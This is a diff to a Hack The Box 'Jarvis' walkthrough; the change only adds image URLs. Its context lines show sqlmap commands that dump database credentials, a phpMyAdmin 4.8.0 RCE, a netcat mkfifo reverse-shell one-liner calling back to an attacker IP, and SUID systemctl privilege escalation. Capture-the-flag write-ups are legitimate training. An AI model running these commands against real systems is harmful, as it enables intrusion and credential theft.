@@ -1,5 +1,5 @@
 # Jarvis [HTB](https://app.hackthebox.com/machines/194)
-![jarvis-01]()
+![jarvis-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/jarvis-01.png)
 
 
 ## Recon 
@@ -10,7 +10,7 @@ After adding the target to my `/etc/hosts` file, I start scanning for open ports
 nmap -p- --min-rate 10000 jarvis.htb
 ```
 
-![ports-02]()
+![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/ports-02.png)
 
 
 Let's run a version detection scan againts these ports:
@@ -19,7 +19,7 @@ Let's run a version detection scan againts these ports:
 nmap -p 22,80,64999 -sCV jarvis.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/nmap-res-03.png)
 
 
 We have the following:
@@ -35,22 +35,22 @@ We have two services in HTTP and SSH running on the target. The site at port 80 
 
 If we browse towards `http://jarvis.htb/` we get the following:
 
-![site-04]()
+![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/site-04.png)
 
 
 The site looks nice, there are several buttons on the main page but only a portion of them actually lead somewhwre. Here are the valid links in the main page:
 
-![links-05]()
+![links-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/links-05.png)
 
 
 Each of these buttons links to a different php script located in the site's root directory. `Home` leads to the home page at `index.php`, `Dining & Bar` links to `dining-bar.php` which shows different meals you can order, but the `Take An Order` button doesn't work:
 
-![order-06]()
+![order-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/order-06.png)
 
 
 The `Rooms` button leads to `rooms-suites.php` which shows different rooms we can book:
 
-![book-07]()
+![book-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/book-07.png)
 
 
 If we hover over the `Book now!` button we will see a link towards `/room.php?cod=1`, if we follow the lin, we will be presented with a page showing only the selected room but there is nothing to do there. 
@@ -64,7 +64,7 @@ I also saw a `Sign In` button at the top right side of the main page but it lead
 
 At the very end of the main page I saw somthing interesting: 
 
-![bottom-08]()
+![bottom-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/buttom-08.png)
 
 
 We see a domain name of `supersecrethotel.htb` as well as a potential username of `logger`. It's worth to keep this username as a potential target as we continue in this machine. I also added the new domain to my `/etc/hosts` file and mapped it to the external IP of the target. 
@@ -76,12 +76,12 @@ At this point I decided to run a directory and file scan using:
 ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://jarvis.htb/FUZZ -e .txt,.xml,.html,.php
 ```
 
-![ffuf-09]()
+![ffuf-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/ffuf-09.png)
 
 
 The most interesting finding here is the [phpmyadmin](https://en.wikipedia.org/wiki/PhpMyAdmin) entry, which is an open source administration tool for MySQL and MariaDB written primary in PHP. If we open this directory we are greeted to a login page:
 
-![login-page-10]()
+![login-page-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/login-page-10.png)
 
 
 I tried to guess different passwords for the `logger` user as well as sending some basic SQLi payloads but to no avail. The fact that we have a phpmyadmin interface though, is a strong indication that there is an SQL db somewhere in this enviorenment.
@@ -92,7 +92,7 @@ The rest of the ffuf scan results weren't super interesting, both `nav.php` and 
 
 While I was checking the different entries I also intercepted traffic in Butp Suite, and that's where I saw something unusual:
 
-![header-11]()
+![header-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/header-11.png)
 
 
 The server gave us the `IronWAF` header. I tried searching for this type of WAF online but I found nothing. My guess is this it's a custom WAF written by the box creator. 
@@ -109,9 +109,9 @@ Here is the breakdown, `-p cod` tells sqlmap which parameter to test in the url.
 
 This scan resulted in the following:
 
-![sqli-12]()
+![sqli-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/sqli-12.png)
 
-![dbs-13]()
+![dbs-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/dbs-13.png)
 
 
 The `cod` parameter is susceptible to various types of SQLI payloads, and `sqlmap` managed to get the available databases.
@@ -126,7 +126,7 @@ So instead I decided to list the tables in the `mysql` database:
 sqlmap -u http://jarvis.htb/room.php?cod=4 -p cod -D mysql --tables --batch -A "NONE"
 ```
 
-![mysql-tables-14]()
+![mysql-tables-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/mysql-tables-14.png)
 
 
 The `user` tabel seems interesting, let's dump it out:
@@ -135,12 +135,12 @@ The `user` tabel seems interesting, let's dump it out:
 sqlmap -u http://jarvis.htb/room.php?cod=4 -p cod -D mysql -T user --dump --batch -A "NONE"
 ```
 
-![pass-15]()
+![pass-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/pass-15.png)
 
 
 The output is a bit messy, but we have a password hash, and `sqlmap` cracked it for us to `imissyou`. The user name is `DBadmin`. We can use these credentials to login to the `phpmyadmin` portal:
 
-![portal-16]()
+![portal-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/portal-16.png)
 
 
 Inside the admin panel we can see that the version of `phpmyadmin` is 4.8.0. If we search online we can find an [RCE exploit](https://www.exploit-db.com/exploits/50457) for versions 4.8.0 - 4.8.1. You can read more about the vulnerability [here](https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e).
@@ -151,7 +151,7 @@ Inside the admin panel we can see that the version of `phpmyadmin` is 4.8.0. If 
 
 Let's go over the exploit quickly. After the script makes a couple of requests to retrive cookies needed for the phpmyadmin session, the main exploit abuses the `import.php` script of `phpmyadmin`:
 
-![exploit-17]()
+![exploit-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/exploit-17.png)
 
 
 We can see the script is injecting a simple PHP web shell wrapped inside an SQL query into a database. Then, it executes this php code by retriving said database with what looks like an LFI vulnerability. 
@@ -173,7 +173,7 @@ Here is the breakdown of the command-line argumnets:
 + Command to run. 
 
 
-![rce-18]()
+![rce-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/rce-18.png)
 
 
 It worked! Now it's a matter of finding a valid payload for a reverse shell. 
@@ -191,7 +191,7 @@ And after a bit of trial and error I found that a netcat based payload works:
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.34 443 >/tmp/f
 ```
 
-![shell-19]()
+![shell-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/shell-19.png)
 
 
 ## Privilege Escalation
@@ -205,12 +205,12 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 Then I list any sudo permissions we have as the `www-data` service account:
 
-![www-sudo-20]()
+![www-sudo-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/www-sudo-20.png)
 
 
 We are able to run this `simpler.py` script as the `pepper` user, which is the only user account on the system:
 
-![users-21]()
+![users-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/users-21.png)
 
 
 Let's take a look at this script:
@@ -281,12 +281,12 @@ rlwrap nc -lnvp 445
 
 And now I ran the simpler script as pepper and typed in something like this:
 
-![exec-22]
+![exec-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/exec-22.png)
 
 
 The shell stalls which is a great sign, and on my netcat listener I get a shell as `pepper`:
 
-![pepper-23]()
+![pepper-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/pepper-23.png)
 
 
 ### Pepper
@@ -296,12 +296,12 @@ After landing on a shell as `pepper` I spwan a TTY shell same as before and list
 
 So I start looking around pepper's home folder and I find this `Web` directory which was also present in the `simpler.py` script:
 
-![pepper-home-24]()
+![pepper-home-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/pepper-home-24.png)
 
 
 Inside this directory there is another directory called `Logs` and inside it, a single file named as my attack machine's IP:
 
-![logs-25]()
+![logs-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/logs-25.png)
 
 
 The interesting thing about this file is that it's owned by root, why? is there some backgrund task? 
@@ -309,7 +309,7 @@ The interesting thing about this file is that it's owned by root, why? is there 
 
 Anyway let's read this file:
 
-![gets-26]()
+![gets-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/gets-26.png)
 
 
 This is near the end of the file, but the general structure throughout the file is the same. These look like the web request we made when we ran `ffuf`. 
@@ -317,7 +317,7 @@ This is near the end of the file, but the general structure throughout the file 
 
 I wasn't sure what to do with this information exactly, so I decided to shift gears and list running processes with `ps auxww`:
 
-![defender-27]()
+![defender-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/defender-27.png)
 
 
 We can see root is running this `sqli_defender.py` script located in he's home directory. Whatever this script is doing we can probably guess it's not doing a really good job at preventing SQLi. But we can't access it because we dont have permissions to root's home folder. 
@@ -338,12 +338,12 @@ Eventually I decided to shift gears and try to find any SUID bnaries on the syst
 find / -perm -4000 2>/dev/null
 ```
 
-![suids-28]()
+![suids-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/suids-28.png)
 
 
 The `systemctl` command typically doens't have a SUID bit set on it. If we list the permissions to the file we see the following:
 
-![perms-29]()
+![perms-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/perms-29.png)
 
 
 We can see our user's group is defined for this binary, and only users in that group and root can execute this binary. 
@@ -390,9 +390,9 @@ And run `systemctl` to link and enable the service:
 
 This stalls my shell window:
 
-![exec-30]()
+![exec-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/exec-30.png)
 
 
 And on my netcat listener I recevie the connection:
 
-![root-31]()
+![root-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jarvis/img/root-31.png)
